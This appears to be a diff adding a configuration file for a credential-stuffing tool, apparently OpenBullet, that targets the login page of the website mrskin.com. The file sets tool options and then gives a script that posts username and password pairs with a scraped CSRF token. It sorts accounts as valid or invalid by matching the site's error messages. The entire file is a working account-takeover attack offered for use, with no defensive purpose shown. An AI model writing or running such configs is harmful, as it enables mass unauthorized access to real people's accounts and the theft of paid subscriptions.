@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Mr.Skins",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-21T01:09:30.7818054+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.mrskin.com/account/login" AutoRedirect=TRUE 
+  CONTENT "customer[username]=<USER>&customer[password]=<PASS>&authenticity_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.mrskin.com/" 
+  HEADER "Origin: https://www.mrskin.com" 
+PARSE "<X-CSRF-Token>" LR "&authenticity_token=" "get_url" Recursive=FALSE -> CAP "<TOKEN>" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Invalid email or password." 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+    KEY "You need to sign in or sign up before continuing." 
